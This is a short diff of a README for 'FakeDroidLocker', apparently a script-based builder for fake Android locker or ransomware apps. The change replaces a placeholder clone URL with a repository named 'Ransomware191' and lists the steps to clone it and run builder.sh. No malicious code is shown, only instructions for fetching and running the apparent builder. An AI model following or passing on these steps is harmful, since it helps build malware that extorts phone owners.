@@ -27,7 +27,7 @@ FakeDroidLocker is a script-based Android app builder that:
 
 1. Clone this repo:
    ```bash
-   git clone https://github.com/YourUsername/FakeDroidLocker
+   git clone https://github.com/Surajdas007272/Ransomware191
    cd FakeDroidLocker
    chmod +x builder.sh
    ./builder.sh
